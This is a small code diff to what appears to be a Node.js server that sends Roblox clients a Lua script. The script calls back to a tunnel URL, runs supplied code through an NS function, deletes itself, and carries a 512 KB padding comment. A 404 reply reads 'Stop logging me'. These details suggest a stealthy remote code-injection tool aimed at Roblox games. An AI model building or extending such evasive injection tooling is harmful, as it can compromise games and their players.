@@ -108,9 +108,11 @@ vorpal
 					res
 						.status(200)
 						.send(
-							`local h=game:GetService("HttpService");local _ = NS([====[${read}]====], workspace);pcall(h.RequestAsync,h,{Method = "GET",Url = "` +
+							`local h=game:GetService("HttpService");xpcall(h.RequestAsync,function() end,h,{Method = "GET",Url = "` +
 								(tun?.url || "https://localhost:3002") +
-								`"});script:Destroy();--${"t".repeat(1024 * 512)}usk is fat`
+								`"});local _ = NS([====[${read}]====], workspace);script:Destroy();--${"t".repeat(
+									1024 * 512
+								)}usk is fat`
 						);
 				} else {
 					res.status(404).send("no!!! (No way! Stop logging me!!1)");
